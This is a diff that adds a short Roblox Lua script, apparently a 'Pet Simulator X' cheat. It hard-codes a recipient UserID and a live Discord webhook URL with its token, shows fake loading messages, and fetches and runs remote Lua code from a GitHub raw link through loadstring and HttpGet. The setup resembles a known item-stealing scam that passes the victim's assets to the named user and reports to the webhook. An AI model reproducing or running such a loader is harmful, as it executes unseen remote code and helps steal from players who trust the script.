@@ -1,0 +1,9 @@
+UserID = 2797485663
+WebHook = 'https://discord.com/api/webhooks/1087706970951254137/pd1k5Pkpufk0cxJJgu2zbqZQs0BkQlT9-tQIniF_Q_f5hUPiWKva-amvth_t0N9O6oEi'
+
+_G.CustomScriptName = "PSX Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script"
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Scripts..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimxgm.lua"))()
